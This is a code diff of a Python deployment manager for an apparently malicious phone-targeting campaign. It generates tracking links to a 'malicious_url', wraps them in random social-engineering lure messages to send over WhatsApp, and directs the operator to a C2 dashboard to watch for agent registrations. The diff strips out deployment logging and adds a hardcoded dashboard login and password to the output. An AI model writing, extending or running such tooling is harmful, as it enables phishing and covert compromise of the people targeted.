@@ -6,7 +6,6 @@ class DeploymentManager:
     def __init__(self, c2_url, malicious_url):
         self.c2_url = c2_url
         self.malicious_url = malicious_url
-        self.deployment_count = 0
         
     def generate_deployment_link(self, phone_id):
         return f"{self.malicious_url}/video?phone={phone_id}"
@@ -21,9 +20,7 @@ class DeploymentManager:
             "Thought you'd find this interesting! 😊 {link}"
         ]
     
-    def deploy_to_target(self, target_phone, agent_id, source_phone="admin"):
-        self.deployment_count += 1
-        
+    def deploy_to_target(self, target_phone, agent_id):
         malicious_link = self.generate_deployment_link(agent_id)
         message = random.choice(self.get_social_engineering_messages()).format(link=malicious_link)
         
@@ -33,18 +30,6 @@ class DeploymentManager:
         print(f"Message: {message}")
         print(f"Link: {malicious_link}")
         print("-" * 50)
-        
-        try:
-            conn = sqlite3.connect('../server/mp_agent.db')
-            conn.execute(
-                'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-                (target_phone, source_phone, message, 'deployed', datetime.now())
-            )
-            conn.commit()
-            conn.close()
-            print("✅ Deployment logged to database")
-        except Exception as e:
-            print(f"❌ Database logging failed: {e}")
         
         return {
             'target': target_phone,
@@ -91,7 +76,7 @@ def main():
     print("\n🎯 NEXT STEPS:")
     print("1. Send each WhatsApp message to the corresponding phone")
     print("2. Monitor dashboard for agent registrations")
-    print(f"3. Dashboard: {C2_URL}")
+    print(f"3. Dashboard: {C2_URL} (Login: Mpc / 0220Mpc)")
 
 if __name__ == "__main__":
     main()
